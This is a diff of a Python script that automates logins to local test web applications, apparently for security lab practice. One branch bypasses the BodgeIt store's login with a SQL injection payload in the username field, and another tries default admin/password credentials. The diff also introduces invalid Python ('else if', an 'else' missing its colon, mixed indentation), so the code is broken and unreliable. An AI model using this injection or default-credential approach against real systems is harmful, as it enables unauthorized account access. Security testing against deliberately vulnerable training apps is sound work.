@@ -15,15 +15,18 @@ class customauth():
 			'username': 'admin',
     	    		'password': 'password'
 	   		}
+	   		p = requests.post(url, data=payload)
 		#will ignore case of text by making it lower and uses sql injection for the admin login
-		if site.lower() == 'bodgeit':
+		else if site.lower() == 'bodgeit':
 	    		url = 'http://127.0.0.1:8080/bodgeit/login.jsp'
 	    		payload = {
 			'action'  : 'login',
     	    		'username': "admin@thebodgeitstore.com' or '1'='1",
     	    		'password': ''
 	    		}
-
-		p = requests.post(url, data=payload)
+			p = requests.post(url, data=payload)
+		else
+			url = site
+			p = requests.post(url)
 		print(p.text)
 	getsite(site)
